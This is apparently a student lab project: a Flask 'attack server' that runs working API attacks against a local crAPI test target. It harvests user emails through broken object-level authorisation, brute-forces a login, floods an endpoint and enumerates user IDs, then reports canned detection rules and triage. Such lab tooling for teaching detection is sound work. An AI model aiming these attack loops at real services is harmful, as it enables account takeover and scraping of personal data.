#!/usr/bin/env python3
"""
CyberShield Attack Server
Connects the web dashboard to real attacks
Runs on localhost:5000
"""
from flask import Flask, jsonify, request
from flask_cors import CORS
import subprocess
import requests
import json
import datetime
import os
import threading

app = Flask(__name__)
CORS(app)

TARGET = "http://localhost:8888"
RESULTS = os.path.expanduser("~/mscproject/experiments")
TOKEN = ""

@app.route('/set_token', methods=['POST'])
def set_token():
    global TOKEN
    data = request.json
    TOKEN = data.get('token', '')
    return jsonify({"status": "ok", "message": "Token set"})

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        "status": "online",
        "target": TARGET,
        "timestamp": datetime.datetime.now().isoformat()
    })

@app.route('/attack/bola', methods=['POST'])
def attack_bola():
    if not TOKEN:
        return jsonify({"error": "No token set"}), 400

    count = request.json.get('count', 20)
    endpoint = TARGET + "/community/api/v2/community/posts/recent"
    headers = {"Authorization": "Bearer " + TOKEN}

    success = 0
    exposed = []
    results = []

    for i in range(count):
        try:
            r = requests.get(endpoint, headers=headers, timeout=5)
            if r.status_code == 200:
                success += 1
                data = r.json()
                for post in data.get("posts", []):
                    email = post.get("author", {}).get("email", "")
                    if email and email not in exposed:
                        exposed.append(email)
            results.append({
                "request": i + 1,
                "status": r.status_code,
                "success": r.status_code == 200
            })
        except Exception as e:
            results.append({"request": i+1, "error": str(e)})

    # Save result
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    result = {
        "attack": "BOLA",
        "owasp": "API1:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "requests": count,
        "successful": success,
        "exposed_users": exposed,
        "severity": "HIGH"
    }
    with open(f"{RESULTS}/live_bola_{ts}.json", "w") as f:
        json.dump(result, f, indent=2)

    return jsonify({
        "attack": "BOLA",
        "owasp": "API1:2023",
        "severity": "HIGH",
        "requests_sent": count,
        "successful": success,
        "exposed_users": exposed,
        "detection": "SPL rule: index=api_logs community/posts/recent",
        "ai_triage": {
            "severity": "HIGH",
            "confidence": "80%",
            "action": "Block IP · Escalate to Tier 2",
            "escalate": "YES"
        }
    })

@app.route('/attack/bruteforce', methods=['POST'])
def attack_bruteforce():
    count = request.json.get('count', 30)
    endpoint = TARGET + "/identity/api/auth/login"
    headers = {"Content-Type": "application/json"}

    attempts = 0
    lockout = False

    for i in range(count):
        try:
            payload = {
                "email": "victim@crapi.com",
                "password": "wrongpassword" + str(i)
            }
            r = requests.post(endpoint, json=payload,
                            headers=headers, timeout=5)
            attempts += 1
            if r.status_code == 429:
                lockout = True
                break
        except Exception as e:
            pass

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    result = {
        "attack": "Brute Force",
        "owasp": "API2:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "attempts": attempts,
        "lockout_detected": lockout,
        "severity": "CRITICAL"
    }
    with open(f"{RESULTS}/live_bruteforce_{ts}.json", "w") as f:
        json.dump(result, f, indent=2)

    return jsonify({
        "attack": "Brute Force",
        "owasp": "API2:2023",
        "severity": "CRITICAL",
        "attempts": attempts,
        "lockout_detected": lockout,
        "vulnerability": "No account lockout detected" if not lockout else "Lockout detected",
        "detection": "SPL rule: index=api_logs auth/login",
        "ai_triage": {
            "severity": "CRITICAL",
            "confidence": "92%",
            "action": "Block IP · Reset credentials · Alert account owner",
            "escalate": "YES"
        }
    })

@app.route('/attack/ratelimit', methods=['POST'])
def attack_ratelimit():
    if not TOKEN:
        return jsonify({"error": "No token set"}), 400

    count = request.json.get('count', 100)
    endpoint = TARGET + "/identity/api/v2/user/dashboard"
    headers = {"Authorization": "Bearer " + TOKEN}

    import time
    success = 0
    throttled = 0
    start = time.time()

    for i in range(count):
        try:
            r = requests.get(endpoint, headers=headers, timeout=5)
            if r.status_code == 200:
                success += 1
            elif r.status_code == 429:
                throttled += 1
        except:
            pass

    elapsed = time.time() - start
    rate = round(count / elapsed, 1)

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    result = {
        "attack": "Rate Limiting",
        "owasp": "API4:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "requests": count,
        "successful": success,
        "throttled": throttled,
        "rate_per_second": rate,
        "severity": "HIGH"
    }
    with open(f"{RESULTS}/live_ratelimit_{ts}.json", "w") as f:
        json.dump(result, f, indent=2)

    return jsonify({
        "attack": "Rate Limiting",
        "owasp": "API4:2023",
        "severity": "HIGH",
        "requests_sent": count,
        "successful": success,
        "throttled": throttled,
        "rate_per_second": rate,
        "vulnerability": "No throttling detected" if throttled == 0 else "Rate limiting active",
        "detection": "SPL rule: index=api_logs user/dashboard",
        "ai_triage": {
            "severity": "HIGH",
            "confidence": "85%",
            "action": "Implement rate limiting · Monitor for data scraping",
            "escalate": "YES"
        }
    })

@app.route('/attack/userenum', methods=['POST'])
def attack_userenum():
    if not TOKEN:
        return jsonify({"error": "No token set"}), 400

    count = request.json.get('count', 30)
    headers = {"Authorization": "Bearer " + TOKEN}
    found = []
    probed = 0

    for i in range(1, count + 1):
        endpoint = TARGET + f"/identity/api/v2/user/{i}/videos"
        try:
            r = requests.get(endpoint, headers=headers, timeout=5)
            probed += 1
            if r.status_code == 200:
                found.append(i)
        except:
            pass

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    result = {
        "attack": "User Enumeration",
        "owasp": "API1:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "ids_probed": probed,
        "valid_found": found,
        "severity": "HIGH"
    }
    with open(f"{RESULTS}/live_userenum_{ts}.json", "w") as f:
        json.dump(result, f, indent=2)

    return jsonify({
        "attack": "User Enumeration",
        "owasp": "API1:2023",
        "severity": "HIGH",
        "ids_probed": probed,
        "valid_found": found,
        "vulnerability": "Sequential ID probing possible",
        "detection": "SPL rule: index=api_logs user/ 404",
        "ai_triage": {
            "severity": "HIGH",
            "confidence": "75%",
            "action": "Monitor IP · Log enumeration pattern",
            "escalate": "YES"
        }
    })

@app.route('/logs/collect', methods=['POST'])
def collect_logs():
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"{RESULTS}/live_logs_{ts}.txt"
    try:
        result = subprocess.run(
            ["sudo", "docker", "logs", "crapi-web"],
            capture_output=True, text=True
        )
        with open(log_file, 'w') as f:
            f.write(result.stdout)
            f.write(result.stderr)
        lines = len(result.stdout.splitlines())
        return jsonify({
            "status": "ok",
            "log_file": log_file,
            "lines": lines
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/triage/run', methods=['POST'])
def run_triage():
    attack = request.json.get('attack', 'BOLA')
    count = request.json.get('count', 20)

    prompt = f"""You are a SOC Tier 1 analyst. Analyse this alert:
Attack: {attack}
Request count: {count}
Source IP: 172.18.0.1
Provide: SEVERITY, ATTACK_TYPE, CONFIDENCE, ACTION, ESCALATE"""

    try:
        result = subprocess.run(
            ["ollama", "run", "llama3.2", prompt],
            capture_output=True, text=True, timeout=60
        )
        return jsonify({
            "status": "ok",
            "attack": attack,
            "triage": result.stdout
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    print("=" * 50)
    print("CyberShield Attack Server")
    print("University of Glasgow — COMPSCI5086P")
    print("Running on http://localhost:5000")
    print("=" * 50)
    app.run(host='0.0.0.0', port=5000, debug=False)
